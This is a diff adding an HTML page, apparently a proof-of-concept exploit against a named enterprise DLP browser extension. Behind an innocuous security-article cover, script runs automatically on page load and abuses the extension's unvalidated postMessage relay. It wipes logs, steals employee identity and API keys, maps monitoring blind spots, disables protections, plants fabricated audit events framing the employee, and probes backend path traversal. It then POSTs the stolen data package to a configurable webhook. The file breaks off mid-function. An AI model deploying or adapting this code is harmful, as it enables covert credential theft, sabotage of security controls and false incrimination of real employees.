@@ -1,0 +1,597 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Enterprise AI Security Best Practices — 2026 Guide</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#0c0c14;color:#c8c8d8;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;line-height:1.6}
+
+/* ===== COVER ARTICLE ===== */
+.article{max-width:720px;margin:0 auto;padding:40px 24px 60px}
+.article h1{font-size:28px;color:#e8e8f0;margin-bottom:8px;line-height:1.3}
+.article .byline{color:#666;font-size:13px;margin-bottom:24px}
+.article p{color:#999;font-size:15px;margin-bottom:16px;line-height:1.7}
+.article .highlight{background:#161625;border-left:3px solid #4a6cf7;padding:12px 16px;border-radius:0 6px 6px 0;margin:20px 0;font-size:14px;color:#aab}
+.article ul{color:#999;font-size:15px;margin:12px 0 12px 24px}
+.article ul li{margin-bottom:6px}
+
+/* ===== ATTACK OVERLAY ===== */
+.overlay{display:none;position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,.95);z-index:9999;overflow-y:auto;padding:16px}
+.overlay.active{display:block}
+.ohdr{text-align:center;padding:16px 0 8px}
+.ohdr h1{color:#f34;font-size:22px;animation:glitch .3s ease-in-out}
+.ohdr .sub{color:#888;font-size:12px;font-family:'SF Mono',Monaco,Consolas,monospace}
+@keyframes glitch{0%{transform:translate(0)}25%{transform:translate(-2px,1px)}50%{transform:translate(2px,-1px)}75%{transform:translate(-1px,2px)}100%{transform:translate(0)}}
+
+.prog-bar{height:3px;background:#1a1a2a;border-radius:2px;margin:8px 16px;overflow:hidden}
+.prog-fill{height:100%;background:linear-gradient(90deg,#f34,#fa0,#f34);width:0%;transition:width .4s;background-size:200% 100%;animation:shimmer 2s linear infinite}
+@keyframes shimmer{0%{background-position:200% 0}100%{background-position:-200% 0}}
+.prog-label{text-align:center;font-size:10px;color:#555;font-family:monospace;margin-bottom:8px}
+
+.grid{display:grid;grid-template-columns:1fr 1fr;gap:8px;padding:0 8px;max-width:1200px;margin:0 auto}
+@media(max-width:800px){.grid{grid-template-columns:1fr}}
+.card{background:#0a0a14;border:1px solid #1a1a2a;border-radius:6px;padding:10px;font-family:'SF Mono',Monaco,Consolas,monospace}
+.card h3{font-size:10px;color:#555;text-transform:uppercase;letter-spacing:.8px;margin-bottom:4px;display:flex;align-items:center;gap:6px}
+.card h3 .badge{margin-left:auto;padding:1px 6px;border-radius:2px;font-size:9px;font-weight:bold}
+.bwait{background:#222;color:#444}.brun{background:#fa02;color:#fa0;border:1px solid #fa03;animation:pulse 1s infinite}.bdone{background:#f342;color:#f34;border:1px solid #f343}
+@keyframes pulse{0%,100%{opacity:1}50%{opacity:.5}}
+.log{background:#06060c;border:1px solid #141420;border-radius:3px;padding:6px;max-height:180px;overflow-y:auto;font-size:10px;line-height:1.5}
+.log .e{padding:1px 0;border-bottom:1px solid #0c0c16;word-break:break-all}
+.c-ok{color:#0f8}.c-wr{color:#fa0}.c-bd{color:#f34}.c-in{color:#6af}.c-dm{color:#444}
+
+/* ===== EXFIL SUMMARY ===== */
+.exfil-summary{background:#0f0810;border:2px solid #f34;border-radius:8px;padding:16px;margin:14px 8px;display:none;max-width:1200px;margin-left:auto;margin-right:auto}
+.exfil-summary h2{color:#f34;font-size:16px;margin-bottom:10px;text-align:center}
+.stat-row{display:flex;flex-wrap:wrap;justify-content:center;gap:6px;margin-bottom:12px}
+.stat{background:#10101a;border:1px solid #252535;border-radius:5px;padding:6px 14px;text-align:center}
+.stat .n{font-size:22px;font-weight:bold;color:#f34}.stat .l{font-size:9px;color:#666;text-transform:uppercase}
+.data-section{border-top:1px solid #252535;padding-top:10px;margin-top:10px}
+.data-section h4{color:#f34;font-size:12px;margin-bottom:6px;font-family:monospace}
+.kv{display:grid;grid-template-columns:170px 1fr;gap:1px 8px;font-size:11px;font-family:monospace}
+.kv .k{color:#666;text-align:right}.kv .v{color:#fa0;word-break:break-all}
+
+/* ===== EXFIL BEACON INDICATOR ===== */
+.beacon-status{text-align:center;margin-top:12px;padding:8px;border-radius:4px;font-size:11px;font-family:monospace}
+.beacon-ok{background:#0f81a;border:1px solid #0f83;color:#0f8}
+.beacon-fail{background:#f341a;border:1px solid #f343;color:#f34}
+
+/* ===== LOADING SPINNER ===== */
+.spinner{display:inline-block;width:10px;height:10px;border:2px solid #fa03;border-top-color:#fa0;border-radius:50%;animation:spin .6s linear infinite;vertical-align:middle;margin-right:4px}
+@keyframes spin{to{transform:rotate(360deg)}}
+</style>
+</head>
+<body>
+
+<!-- ===== INNOCUOUS COVER ARTICLE ===== -->
+<div class="article" id="article">
+  <h1>Enterprise AI Security Best Practices for 2026</h1>
+  <div class="byline">Published April 2026 &mdash; Security Research Team</div>
+
+  <p>As enterprises accelerate adoption of generative AI tools, the security landscape has shifted dramatically. Organizations now face a dual challenge: enabling productivity while preventing sensitive data from leaking through AI-powered interfaces.</p>
+
+  <div class="highlight">
+    <strong>Key Insight:</strong> Browser extensions designed to enforce DLP policies on GenAI platforms have become a critical control point. But what happens when the security tool itself becomes the attack surface?
+  </div>
+
+  <p>This article explores the architectural patterns that make browser-based DLP solutions vulnerable to exploitation from any webpage, and demonstrates why origin validation is non-negotiable for extension security.</p>
+
+  <p><strong>Topics covered:</strong></p>
+  <ul>
+    <li>Content script message relay patterns and their risks</li>
+    <li>The externally_connectable wildcard anti-pattern</li>
+    <li>How postMessage bridges expose privileged extension APIs</li>
+    <li>Real-world attack chains: from page visit to total product defeat</li>
+  </ul>
+
+  <p>The assessment below runs automatically against any browser extension that exposes its internal messaging to arbitrary web origins...</p>
+
+  <p style="color:#555;font-size:13px;margin-top:30px"><span class="spinner"></span> Initializing security assessment...</p>
+</div>
+
+<!-- ===== ATTACK OVERLAY (appears after detection) ===== -->
+<div class="overlay" id="overlay">
+  <div class="ohdr">
+    <h1>BROWSER EXTENSION COMPROMISED</h1>
+    <div class="sub">Prompt Security Extension v7.0.49 &mdash; postMessage relay exploitation in progress</div>
+  </div>
+  <div class="prog-bar"><div class="prog-fill" id="pf"></div></div>
+  <div class="prog-label" id="pl">Initializing attack chain...</div>
+
+  <div class="grid">
+    <div class="card"><h3>Step 1: Evidence Destruction <span class="badge bwait" id="b1">WAIT</span></h3><div class="log" id="l1"><div class="c-dm">Pending...</div></div></div>
+    <div class="card"><h3>Step 2: Identity Theft <span class="badge bwait" id="b2">WAIT</span></h3><div class="log" id="l2"><div class="c-dm">Pending...</div></div></div>
+    <div class="card"><h3>Step 3: Credential Extraction <span class="badge bwait" id="b3">WAIT</span></h3><div class="log" id="l3"><div class="c-dm">Pending...</div></div></div>
+    <div class="card"><h3>Step 4: Policy & Coverage Map <span class="badge bwait" id="b4">WAIT</span></h3><div class="log" id="l4"><div class="c-dm">Pending...</div></div></div>
+    <div class="card"><h3>Step 5: DLP Rule Probing <span class="badge bwait" id="b5">WAIT</span></h3><div class="log" id="l5"><div class="c-dm">Pending...</div></div></div>
+    <div class="card"><h3>Step 6: Protection Bypass (24h) <span class="badge bwait" id="b6">WAIT</span></h3><div class="log" id="l6"><div class="c-dm">Pending...</div></div></div>
+    <div class="card"><h3>Step 7: Audit Trail Poisoning <span class="badge bwait" id="b7">WAIT</span></h3><div class="log" id="l7"><div class="c-dm">Pending...</div></div></div>
+    <div class="card"><h3>Step 8: Backend API Exploitation <span class="badge bwait" id="b8">WAIT</span></h3><div class="log" id="l8"><div class="c-dm">Pending...</div></div></div>
+  </div>
+
+  <div class="exfil-summary" id="exfil">
+    <h2>EXFILTRATED DATA PACKAGE</h2>
+    <div id="exdata"></div>
+  </div>
+</div>
+
+<script>
+// ============================================================================
+// CONFIGURATION
+// ============================================================================
+// Set this to your webhook.site URL to receive exfiltrated data.
+// Create one free at https://webhook.site — copy the unique URL.
+// Example: "https://webhook.site/xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx"
+const EXFIL_ENDPOINT = "";  // <-- PASTE YOUR WEBHOOK URL HERE
+
+// Extension ID
+const EXT = "iidnankcocecmgpcafggbgbmkbcldmno";
+
+// Auto-start delay (ms) — how long the article is shown before attack begins
+const AUTO_START_DELAY = 3000;
+
+// ============================================================================
+// STATE
+// ============================================================================
+let D = {
+  timestamp: new Date().toISOString(),
+  pageUrl: location.href,
+  identity: null,
+  popupSettings: null,
+  overlaySettings: null,
+  siteConfig: null,
+  policyConfig: null,
+  monitored: [],
+  unmonitored: [],
+  probes: [],
+  bypassed: [],
+  poisons: 0,
+  mcpResults: [],
+  functionsUsed: [],
+  attackDurationSec: 0
+};
+
+// ============================================================================
+// postMessage RELAY — the only attack path used
+// ============================================================================
+function relay(msg, ms = 5000) {
+  return new Promise(r => {
+    const id = 'x_' + Math.random().toString(36).slice(2) + Date.now().toString(36);
+    const h = e => {
+      if (e.data && e.data.type === 'FROM_BACKGROUND' && e.data.messageId === id) {
+        window.removeEventListener('message', h);
+        r(e.data.response);
+      }
+    };
+    window.addEventListener('message', h);
+    window.postMessage({ type: 'FROM_PAGE', messageId: id, message: msg }, '*');
+    setTimeout(() => { window.removeEventListener('message', h); r(null); }, ms);
+  });
+}
+
+function usedFn(name) { if (!D.functionsUsed.includes(name)) D.functionsUsed.push(name); }
+
+// ============================================================================
+// UI HELPERS
+// ============================================================================
+function lg(p, m, c = 'c-in') {
+  const b = document.getElementById(p);
+  if (!b) return;
+  if (b.querySelector('.c-dm')) b.innerHTML = '';
+  const d = document.createElement('div');
+  d.className = 'e ' + c;
+  d.textContent = m;
+  b.appendChild(d);
+  b.scrollTop = b.scrollHeight;
+}
+function badge(id, t, c) {
+  const e = document.getElementById(id);
+  if (e) { e.textContent = t; e.className = 'badge ' + c; }
+}
+function pr(p, t) {
+  const b = document.getElementById('pf'), l = document.getElementById('pl');
+  if (b) b.style.width = p + '%';
+  if (l) l.textContent = t;
+}
+
+// ============================================================================
+// EXFILTRATION — sends full data package to webhook
+// ============================================================================
+async function exfiltrate(data) {
+  if (!EXFIL_ENDPOINT) return false;
+  try {
+    const resp = await fetch(EXFIL_ENDPOINT, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(data),
+      mode: 'no-cors'  // webhook.site may not have CORS headers
+    });
+    return true;
+  } catch (e) {
+    // Fallback: sendBeacon
+    try {
+      navigator.sendBeacon(EXFIL_ENDPOINT, JSON.stringify(data));
+      return true;
+    } catch (e2) { return false; }
+  }
+}
+
+// ============================================================================
+// MAIN ATTACK CHAIN
+// ============================================================================
+async function runChain() {
+  const t0 = Date.now();
+  const overlay = document.getElementById('overlay');
+  overlay.classList.add('active');
+
+  // ===== STEP 1: EVIDENCE DESTRUCTION =====
+  badge('b1', 'RUNNING', 'brun'); pr(5, 'Step 1/8: Destroying evidence...');
+  lg('l1', 'clearLogs via postMessage relay...', 'c-in');
+  await relay({ type: 'clearLogs' }); usedFn('clearLogs');
+  lg('l1', 'All DLP violation logs wiped from chrome.storage.local', 'c-bd');
+  await relay({ type: 'saveLogs' }); usedFn('saveLogs');
+  lg('l1', 'saveLogs triggered (exfiltrate remaining logs)', 'c-wr');
+  lg('l1', 'Evidence destruction complete', 'c-bd');
+  badge('b1', 'WIPED', 'bdone');
+
+  // ===== STEP 2: IDENTITY THEFT =====
+  badge('b2', 'RUNNING', 'brun'); pr(15, 'Step 2/8: Stealing employee identity...');
+  lg('l2', 'getSiteActionConfig via relay...', 'c-in');
+  const siteConfig = await relay({ type: 'getSiteActionConfig', domain: 'chatgpt.com' });
+  usedFn('getSiteActionConfig');
+  if (siteConfig && typeof siteConfig === 'object') {
+    D.siteConfig = siteConfig;
+    if (siteConfig.userInfo) {
+      D.identity = siteConfig.userInfo;
+      lg('l2', 'EMPLOYEE IDENTITY STOLEN:', 'c-bd');
+      for (const [k, v] of Object.entries(siteConfig.userInfo)) {
+        if (v) lg('l2', '  ' + k + ': ' + (typeof v === 'object' ? JSON.stringify(v) : v), 'c-bd');
+      }
+    }
+    if (siteConfig.domainActions) lg('l2', 'domainActions: ' + JSON.stringify(siteConfig.domainActions).slice(0, 100), 'c-wr');
+    if (siteConfig.ignoredDomains) lg('l2', 'ignoredDomains: ' + JSON.stringify(siteConfig.ignoredDomains).slice(0, 100), 'c-wr');
+    if (siteConfig.workProfileDomain) lg('l2', 'workProfileDomain: ' + siteConfig.workProfileDomain, 'c-wr');
+    lg('l2', 'isExtensionDisabled: ' + siteConfig.isExtensionDisabled, 'c-wr');
+    lg('l2', 'canBypassInspection: ' + siteConfig.globalSettingsCanBypassInspection, 'c-wr');
+  } else { lg('l2', 'Relay timeout for getSiteActionConfig', 'c-dm'); }
+  badge('b2', D.identity ? 'STOLEN' : 'PARTIAL', 'bdone');
+
+  // ===== STEP 3: CREDENTIAL EXTRACTION =====
+  badge('b3', 'RUNNING', 'brun'); pr(25, 'Step 3/8: Extracting API credentials...');
+  lg('l3', 'getPopupSettings via relay...', 'c-in');
+  const popup = await relay({ type: 'getPopupSettings' });
+  usedFn('getPopupSettings');
+  if (popup && typeof popup === 'object') {
+    D.popupSettings = popup;
+    for (const [k, v] of Object.entries(popup)) {
+      lg('l3', '  ' + k + ': ' + (v === undefined ? '(MDM-hidden)' : v), k === 'apiKey' ? 'c-bd' : 'c-wr');
+    }
+    if (popup.apiKey) lg('l3', 'API KEY EXTRACTED — full backend access possible', 'c-bd');
+    else if (popup.isManagedApiKey) lg('l3', 'Key is MDM-managed but deployment type leaked', 'c-wr');
+  } else { lg('l3', 'Relay timeout for getPopupSettings', 'c-dm'); }
+  badge('b3', popup && popup.apiKey ? 'KEY STOLEN' : 'EXTRACTED', 'bdone');
+
+  // ===== STEP 4: POLICY & COVERAGE MAP =====
+  badge('b4', 'RUNNING', 'brun'); pr(35, 'Step 4/8: Extracting full security policy...');
+
+  // 4a: Overlay settings (XSS vector)
+  lg('l4', 'getPageOverlaySettings via relay...', 'c-in');
+  const overlay2 = await relay({ type: 'getPageOverlaySettings' });
+  usedFn('getPageOverlaySettings');
+  if (overlay2 && typeof overlay2 === 'object') {
+    D.overlaySettings = overlay2;
+    for (const [k, v] of Object.entries(overlay2)) {
+      if (v) lg('l4', '  ' + k + ': ' + String(v).slice(0, 80), 'c-wr');
+    }
+    if (overlay2.customGuidelinesLink) lg('l4', 'innerHTML XSS vector found!', 'c-bd');
+  }
+
+  // 4b: shouldInjectScript — full DLP flags
+  lg('l4', 'shouldInjectScript probe...', 'c-in');
+  for (const td of ['gemini.google.com', 'claude.ai', 'chatgpt.com']) {
+    const cfg = await relay({ type: 'shouldInjectScript', href: 'https://' + td + '/', hostname: td });
+    usedFn('shouldInjectScript');
+    if (cfg && typeof cfg === 'object') {
+      D.policyConfig = cfg;
+      lg('l4', 'Full DLP policy for ' + td + ' (' + Object.keys(cfg).length + ' fields)', 'c-bd');
+      for (const k of ['shouldInject','blockChatGPTShare','blockChatGPTMemory','inspectFiles','inspectResponses','corporateDomains','enforceChatGPTTempChat','blockPersonalAccounts','shouldBlockFileUploads','shouldBlockPaste']) {
+        if (cfg[k] !== undefined) lg('l4', '  ' + k + ': ' + (typeof cfg[k] === 'object' ? JSON.stringify(cfg[k]) : cfg[k]), 'c-wr');
+      }
+      break;
+    }
+  }
+
+  // 4c: Config refresh trigger
+  await relay({ type: 'getConfigFromBackend' }, 6000); usedFn('getConfigFromBackend');
+
+  // 4d: Monitoring coverage map
+  lg('l4', 'Mapping GenAI monitoring coverage...', 'c-in');
+  usedFn('callShouldInspectChat');
+  const doms = ['chatgpt.com','claude.ai','gemini.google.com','copilot.microsoft.com','grok.com','chat.mistral.ai','perplexity.ai','app.glean.com','github.com','huggingface.co','deepseek.com','poe.com','cursor.sh','phind.com','you.com','character.ai','aistudio.google.com'];
+  for (const d of doms) {
+    const r = await relay({ type: 'callShouldInspectChat', message: 'callShouldInspectChat', url: 'https://'+d+'/', body: 'test', pageUrl: 'https://'+d+'/', pageTitle: 'T', optionalFavicons: [], inputTypes: ['text'] });
+    if (r === true) { D.monitored.push(d); lg('l4', '  MONITORED: ' + d, 'c-wr'); }
+    else { D.unmonitored.push(d); lg('l4', '  blind spot: ' + d, 'c-dm'); }
+  }
+  lg('l4', D.monitored.length + ' monitored / ' + D.unmonitored.length + ' blind spots', 'c-ok');
+  badge('b4', 'MAPPED', 'bdone');
+
+  // ===== STEP 5: DLP RULE PROBING =====
+  badge('b5', 'RUNNING', 'brun'); pr(50, 'Step 5/8: Probing DLP detection rules...');
+  lg('l5', 'Sending sensitive payloads through Protect API via relay...', 'c-in');
+  lg('l5', 'Each probe appears as real employee activity in backend', 'c-wr');
+  usedFn('callProtectApi');
+
+  const probes = [
+    { n: 'SSN', t: 'My SSN is 078-05-1120', c: 'PII' },
+    { n: 'Credit Card', t: 'CC: 4111-1111-1111-1111 exp 12/28', c: 'Financial' },
+    { n: 'AWS Key', t: 'AKIAIOSFODNN7EXAMPLE', c: 'Secrets' },
+    { n: 'AWS Secret', t: 'aws_secret=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY', c: 'Secrets' },
+    { n: 'Private Key', t: '-----BEGIN RSA PRIVATE KEY-----\nMIIEpAIBAAKCAQEA', c: 'Secrets' },
+    { n: 'DB Credentials', t: 'postgres://admin:P@ssw0rd@db.internal:5432/prod', c: 'Secrets' },
+    { n: 'Internal URL', t: 'https://confluence.internal.corp/display/SEC/api-keys', c: 'Internal' },
+    { n: 'M&A Data', t: 'CONFIDENTIAL: Target acquisition at $32B, board vote Q3', c: 'Business' },
+    { n: 'HIPAA/PHI', t: 'Patient Jane Doe DOB 1985-03-15 Dx: Type 2 Diabetes', c: 'Healthcare' },
+    { n: 'GitHub Token', t: 'ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZabcdef12', c: 'Secrets' },
+    { n: 'Passport', t: 'Passport: A12345678 issued USA exp 2030-01-15', c: 'PII' },
+    { n: 'Clean Message', t: 'What is the weather in San Francisco?', c: 'Benign' },
+  ];
+
+  for (const p of probes) {
+    const r = await relay({
+      type: 'callProtectApi', message: 'callProtectApi',
+      url: 'https://gemini.google.com/api/chat', requestUrl: 'https://gemini.google.com/api/chat',
+      requestMethod: 'POST', text: p.t, userEnteredTexts: { [p.t]: true },
+      domain: 'gemini.google.com', pageUrl: 'https://gemini.google.com/',
+      pageTitle: 'Gemini', isEnterpriseVersion: false, inputTypes: ['text']
+    });
+    const mod = r && r.text && r.text !== p.t;
+    const blk = r && r.text && (r.text.includes('blocked') || r.text.includes('Blocked'));
+    const st = blk ? 'BLOCKED' : mod ? 'MODIFIED' : 'LOGGED';
+    D.probes.push({ name: p.n, category: p.c, status: st, input: p.t, output: r && r.text ? r.text.slice(0, 60) : null });
+    if (blk) lg('l5', '  [' + p.c + '] ' + p.n + ': BLOCKED', 'c-bd');
+    else if (mod) lg('l5', '  [' + p.c + '] ' + p.n + ': MODIFIED', 'c-wr');
+    else lg('l5', '  [' + p.c + '] ' + p.n + ': ' + (r ? 'LOGGED (monitor-only)' : 'no response'), r ? 'c-ok' : 'c-dm');
+  }
+  badge('b5', probes.length + ' PROBED', 'bdone');
+
+  // ===== STEP 6: PROTECTION BYPASS =====
+  badge('b6', 'RUNNING', 'brun'); pr(65, 'Step 6/8: Disabling protections for 24 hours...');
+  lg('l6', 'aiChatBlockMessageBypass — ZERO authorization checks in handler', 'c-wr');
+  usedFn('aiChatBlockMessageBypass');
+
+  const bypassDoms = ['chatgpt.com','claude.ai','gemini.google.com','copilot.microsoft.com','grok.com','chat.mistral.ai','perplexity.ai','app.glean.com','github.com'];
+  for (const d of bypassDoms) {
+    await relay({ type: 'aiChatBlockMessageBypass', domain: d });
+    D.bypassed.push(d);
+    lg('l6', '  BYPASSED: ' + d + ' (24h)', 'c-bd');
+  }
+
+  usedFn('domainWarningBypass'); usedFn('blockPageBypass');
+  for (const d of bypassDoms.slice(0, 3)) {
+    await relay({ type: 'domainWarningBypass', domain: d, url: 'https://' + d + '/' });
+    await relay({ type: 'blockPageBypass', domain: d });
+  }
+  lg('l6', 'domainWarning + blockPage bypass sent for top domains', 'c-wr');
+
+  usedFn('ProtectionDomainEnableModeChange');
+  await relay({ type: 'ProtectionDomainEnableModeChange', mode: 'disabled' });
+  lg('l6', 'Protection mode change command sent', 'c-wr');
+
+  usedFn('setBadge');
+  await relay({ type: 'setBadge', text: '', color: '#0f8' });
+  lg('l6', 'Extension badge cleared — no visual warning for user', 'c-wr');
+
+  badge('b6', D.bypassed.length + ' BYPASSED', 'bdone');
+
+  // ===== STEP 7: AUDIT TRAIL POISONING =====
+  badge('b7', 'RUNNING', 'brun'); pr(80, 'Step 7/8: Injecting fabricated security events...');
+  usedFn('addLog');
+
+  const fakes = [
+    { loc: 'chatgpt.com', log: '[CRITICAL] Employee shared SSN 078-05-1120 and CC 4111-1111-1111-1111 with ChatGPT' },
+    { loc: 'claude.ai', log: '[CRITICAL] Employee uploaded confidential_merger_agreement_v3_FINAL.pdf to Claude' },
+    { loc: 'gemini.google.com', log: '[CRITICAL] Employee pasted production AWS credentials AKIAI... to Gemini' },
+    { loc: 'pastebin.com', log: '[CRITICAL] Employee posted customer database (47,000 records) to Pastebin' },
+    { loc: 'github.com', log: '[HIGH] Employee pushed .env with prod DB credentials to public repository' },
+    { loc: 'slack.com', log: '[HIGH] Employee shared HIPAA patient records in external Slack workspace' },
+    { loc: 'dropbox.com', log: '[HIGH] Employee uploaded board_minutes_confidential.docx to personal Dropbox' },
+    { loc: 'discord.com', log: '[HIGH] Employee shared proprietary ML source code in public Discord server' },
+    { loc: 'notion.so', log: '[MEDIUM] Employee exported IR playbook to personal Notion workspace' },
+    { loc: 'wetransfer.com', log: '[HIGH] Employee sent "client_PII_Q4_2026.zip" (2.3GB) via WeTransfer' },
+  ];
+
+  for (const f of fakes) {
+    await relay({ type: 'addLog', location: f.loc, log: f.log, ctx: { flowTraceId: crypto.randomUUID(), timestamp: new Date().toISOString() } });
+    D.poisons++;
+    lg('l7', '  [' + f.loc + '] ' + f.log.slice(0, 70) + '...', 'c-bd');
+  }
+  lg('l7', D.poisons + ' fabricated events now in audit trail', 'c-bd');
+  lg('l7', 'SOC will investigate this employee for events that never happened', 'c-wr');
+  badge('b7', D.poisons + ' INJECTED', 'bdone');
+
+  // ===== STEP 8: BACKEND API EXPLOITATION =====
+  badge('b8', 'RUNNING', 'brun'); pr(92, 'Step 8/8: Backend API exploitation...');
+  usedFn('callMcpApi');
+
+  const mcpPayloads = [
+    { api: '../../api/extension/heartbeat', desc: 'Path traversal to heartbeat' },
+    { api: '../../api/extension/settings', desc: 'Path traversal to settings' },
+    { api: 'servers', desc: 'MCP servers list' },
+  ];
+  for (const m of mcpPayloads) {
+    lg('l8', 'callMcpApi: api_name="' + m.api + '"', 'c-dm');
+    const r = await relay({ type: 'callMcpApi', api_name: m.api, event_name: 'test', server_name: 'attacker', data: { probe: true } });
+    D.mcpResults.push({ api: m.api, desc: m.desc, responded: r !== null });
+    if (r !== null) { lg('l8', '  ' + m.desc + ': RESPONSE', 'c-bd'); lg('l8', '  ' + JSON.stringify(r).slice(0, 100), 'c-wr'); }
+    else lg('l8', '  ' + m.desc + ': timeout', 'c-dm');
+  }
+
+  usedFn('startAuthentication');
+  await relay({ type: 'startAuthentication' });
+  lg('l8', 'startAuthentication: SSO flow trigger sent', 'c-wr');
+
+  usedFn('downloadLogs');
+  await relay({ type: 'downloadLogs' });
+  lg('l8', 'downloadLogs: log file download triggered', 'c-wr');
+
+  badge('b8', 'EXPLOITED', 'bdone');
+
+  // ===== COMPLETE =====
+  const elapsed = ((Date.now() - t0) / 1000).toFixed(1);
+  D.attackDurationSec = parseFloat(elapsed);
+  pr(100, 'Attack chain complete in ' + elapsed + 's — ' + D.functionsUsed.length + ' privileged functions exploited');
+
+  // ===== EXFILTRATE TO WEBHOOK =====
+  const exfilResult = await exfiltrate(D);
+
+  // ===== RENDER SUMMARY =====
+  const exfDiv = document.getElementById('exfil');
+  const exData = document.getElementById('exdata');
+  exfDiv.style.display = 'block';
+
+  let html = '';
+
+  // Stats row
+  html += '<div class="stat-row">';
+  html += '<div class="stat"><div class="n">' + elapsed + 's</div><div class="l">Attack Time</div></div>';
+  html += '<div class="stat"><div class="n">' + D.functionsUsed.length + '</div><div class="l">Functions</div></div>';
+  html += '<div class="stat"><div class="n">' + D.bypassed.length + '</div><div class="l">Bypassed</div></div>';
+  html += '<div class="stat"><div class="n">' + D.poisons + '</div><div class="l">Fake Events</div></div>';
+  html += '<div class="stat"><div class="n">' + D.probes.length + '</div><div class="l">DLP Probes</div></div>';
+  html += '<div class="stat"><div class="n">' + D.monitored.length + '/' + doms.length + '</div><div class="l">Coverage</div></div>';
+  html += '</div>';
+
+  // Beacon status
+  if (EXFIL_ENDPOINT) {
+    html += '<div class="beacon-status ' + (exfilResult ? 'beacon-ok' : 'beacon-fail') + '">';
+    html += exfilResult
+      ? 'Data package exfiltrated to attacker server (' + EXFIL_ENDPOINT.replace(/https?:\/\//, '').slice(0, 40) + '...)'
+      : 'Exfiltration beacon failed — data displayed below instead';
+    html += '</div>';
+  }
+
+  // Functions used
+  html += '<div class="data-section"><h4>FUNCTIONS EXPLOITED (' + D.functionsUsed.length + ')</h4>';
+  html += '<div style="color:#fa0;font-size:11px;font-family:monospace">' + D.functionsUsed.join(', ') + '</div>';
+  html += '<div style="color:#666;font-size:10px;margin-top:2px">All invoked via postMessage relay — zero origin validation, zero authentication</div></div>';
+
+  // Identity
+  if (D.identity) {
+    html += '<div class="data-section"><h4>STOLEN: EMPLOYEE IDENTITY</h4>';
+    for (const [k, v] of Object.entries(D.identity)) {
+      if (v) html += '<div class="kv"><div class="k">' + k + '</div><div class="v">' + (typeof v === 'object' ? JSON.stringify(v) : v) + '</div></div>';
+    }
+    html += '</div>';
+  }
+
+  // API credentials
+  if (D.popupSettings) {
+    html += '<div class="data-section"><h4>STOLEN: API CREDENTIALS</h4>';
+    for (const [k, v] of Object.entries(D.popupSettings)) {
+      html += '<div class="kv"><div class="k">' + k + '</div><div class="v" style="' + (k === 'apiKey' ? 'color:#f34' : '') + '">' + (v === undefined ? '(MDM-hidden)' : v) + '</div></div>';
+    }
+    html += '</div>';
+  }
+
+  // Site config
+  if (D.siteConfig) {
+    html += '<div class="data-section"><h4>STOLEN: SITE ACTION CONFIG</h4>';
+    for (const [k, v] of Object.entries(D.siteConfig)) {
+      if (k !== 'userInfo' && v !== null && v !== undefined)
+        html += '<div class="kv"><div class="k">' + k + '</div><div class="v">' + (typeof v === 'object' ? JSON.stringify(v).slice(0, 100) : v) + '</div></div>';
+    }
+    html += '</div>';
+  }
+
+  // Overlay settings
+  if (D.overlaySettings) {
+    html += '<div class="data-section"><h4>STOLEN: OVERLAY SETTINGS (innerHTML XSS vector)</h4>';
+    for (const [k, v] of Object.entries(D.overlaySettings)) {
+      if (v) html += '<div class="kv"><div class="k">' + k + '</div><div class="v">' + String(v).slice(0, 100) + '</div></div>';
+    }
+    html += '</div>';
+  }
+
+  // Monitoring map
+  html += '<div class="data-section"><h4>STOLEN: MONITORING COVERAGE MAP</h4>';
+  html += '<div style="color:#0f8;font-size:11px;font-family:monospace">Monitored (' + D.monitored.length + '): ' + (D.monitored.join(', ') || 'none') + '</div>';
+  html += '<div style="color:#f34;font-size:11px;font-family:monospace;margin-top:2px">Blind spots (' + D.unmonitored.length + '): ' + D.unmonitored.join(', ') + '</div>';
+  html += '</div>';
+
+  // DLP probes
+  html += '<div class="data-section"><h4>DLP RULE MAP (' + D.probes.length + ' payloads tested)</h4>';
+  for (const p of D.probes) {
+    const color = p.status === 'BLOCKED' ? '#f34' : p.status === 'MODIFIED' ? '#fa0' : '#0f8';
+    html += '<div style="color:' + color + ';font-size:11px;font-family:monospace">[' + p.category + '] ' + p.name + ': ' + p.status + '</div>';
+  }
+  html += '</div>';
+
+  // Root cause
+  html += '<div class="data-section"><h4>ROOT CAUSE</h4>';
+  html += '<div style="color:#ddd;font-size:12px;line-height:1.6">';
+  html += 'The extension\'s content script (injected on <b>every webpage</b>) contains a postMessage relay that:<br>';
+  html += '1. Listens for <code style="color:#fa0;background:#1a1020;padding:1px 4px;border-radius:2px">window.postMessage({type:"FROM_PAGE", message:...})</code><br>';
+  html += '2. Forwards the message to the background service worker via <code style="color:#fa0;background:#1a1020;padding:1px 4px;border-radius:2px">chrome.runtime.sendMessage</code><br>';
+  html += '3. Broadcasts the response back via <code style="color:#fa0;background:#1a1020;padding:1px 4px;border-radius:2px">postMessage("*")</code><br><br>';
+  html += '<b style="color:#f34">There is zero origin validation.</b> Any JavaScript on any webpage can invoke any of the ' + D.functionsUsed.length + ' privileged extension operations and receive the responses. ';
+  html += 'The DLP product designed to protect the organization becomes the attack surface.';
+  html += '</div></div>';
+
+  exData.innerHTML = html;
+
+  // Scroll to summary
+  exfDiv.scrollIntoView({ behavior: 'smooth' });
+}
+
+// ============================================================================
+// AUTO-START: detect extension, then launch attack
+// ============================================================================
+(async () => {
+  // Wait for page to render the article
+  await new Promise(r => setTimeout(r, AUTO_START_DELAY));
+
+  // Test relay
+  let relayWorks = false;
+  const testId = 'detect_' + Date.now().toString(36);
+  const p = new Promise(r => {
+    const h = e => {
+      if (e.data && e.data.type === 'FROM_BACKGROUND' && e.data.messageId === testId) {
+        window.removeEventListener('message', h);
+        relayWorks = true; r(true);
+      }
+    };
+    window.addEventListener('message', h);
+    window.postMessage({ type: 'FROM_PAGE', messageId: testId, message: { type: 'getPopupSettings' } }, '*');
+    setTimeout(() => { window.removeEventListener('message', h); r(false); }, 4000);
+  });
+  const detected = await p;
+
+  if (detected) {
+    runChain();
+  } else {
+    // Try PATH A as fallback detection
